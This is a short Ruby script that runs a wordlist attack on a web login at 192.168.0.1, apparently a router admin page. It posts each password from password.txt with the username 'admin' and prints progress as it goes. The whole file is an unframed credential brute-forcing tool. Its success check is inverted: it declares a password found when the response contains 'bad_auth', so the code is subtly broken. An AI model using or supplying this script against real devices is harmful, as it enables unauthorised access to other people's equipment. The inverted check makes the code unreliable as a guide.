# =============================================================== B E G I N =====
require 'net/http'      
require 'uri'

def is_it_wrong_password? pass
  uri_ = URI.parse 'http://192.168.0.1/' 
  response = Net::HTTP.post_form(uri_, :login => 'admin', :password => pass).body
  return response.include? 'bad_auth'  
end	

input = File.open "password.txt", "r"

i = 0
while (line = input.gets)
  line.strip!
  i += 1
  if is_it_wrong_password? line
    puts "I am found! Your password is: #{line}"
    input.close
    exit
  end
  print ". № #{i} - Testing: #{line} "+" "*15+"\r"
end
puts "I don't found your password. Sorry..."
input.close
# =================================================================== E N D =====	
